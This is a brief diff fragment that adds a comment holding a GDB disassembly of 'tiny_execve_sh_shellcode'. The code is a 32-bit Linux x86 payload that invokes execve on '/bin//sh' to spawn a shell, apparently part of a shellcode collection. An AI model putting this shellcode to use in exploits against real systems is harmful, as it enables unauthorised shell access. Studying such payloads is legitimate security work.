@@ -22,6 +22,19 @@
 */
 
 /*
+Dump of assembler code for function shellcode:
+=> 0x0804972c <+0>:     xor    %ecx,%ecx
+   0x0804972e <+2>:     mul    %ecx
+   0x08049730 <+4>:     mov    $0xb,%al
+   0x08049732 <+6>:     push   %ecx
+   0x08049733 <+7>:     push   $0x68732f2f
+   0x08049738 <+12>:    push   $0x6e69622f
+   0x0804973d <+17>:    mov    %esp,%ebx
+   0x0804973f <+19>:    int    $0x80
+   0x08049741 <+21>:    add    %al,(%eax)
+*/
+
+/*
 
    tiny_execve_sh_shellcode
 
